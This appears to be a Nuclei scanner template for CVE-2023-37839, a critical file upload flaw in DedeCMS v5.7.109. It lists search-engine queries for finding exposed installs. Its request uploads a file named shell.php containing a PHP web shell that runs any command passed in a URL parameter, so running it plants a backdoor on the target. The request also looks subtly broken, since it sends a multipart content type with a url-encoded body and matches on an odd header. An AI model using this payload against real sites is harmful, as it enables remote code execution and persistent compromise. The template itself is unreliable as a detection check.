id: CVE-2023-37839

info:
  name: DedeCMS v5.7.109 Arbitrary File Upload Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: An arbitrary file upload vulnerability in /dede/file_manage_control.php of DedeCMS v5.7.109 allows attackers to execute arbitrary code via uploading a crafted PHP file.
  impact: |
    High - Remote code execution can be achieved by an attacker.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version.
  reference:
    - https://github.com/yezere/src/blob/main/Dedecms%20v5.7.109%20Background%20Command%20Execution%20Vulnerability.md
    - https://github.com/fkie-cad/nvd-json-data-feeds
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-37839
    cwe-id: CWE-434
    epss-score: 0.00307
    epss-percentile: 0.70593
    cpe: cpe:2.3:a:dedecms:dedecms:5.7.109:*:*:*:*:*:*:*
  metadata:
    vendor: dedecms
    product: dedecms
    shodan-query: http.html:"DedeCms"
    fofa-query: app="DedeCMS"
    google-query: intitle:"dedecms" || http.html:"power by dedecms"

http:
  - method: POST
    path:
      - "{{BaseURL}}/dede/file_manage_control.php"

    body: |
      action=upload&file=shell.php&content=<?php echo shell_exec($_GET['cmd']); ?>

    headers:
      Content-Type: multipart/form-data
    matchers:
      - type: word
        words:
          - "Type: application/x-php"
        part: header
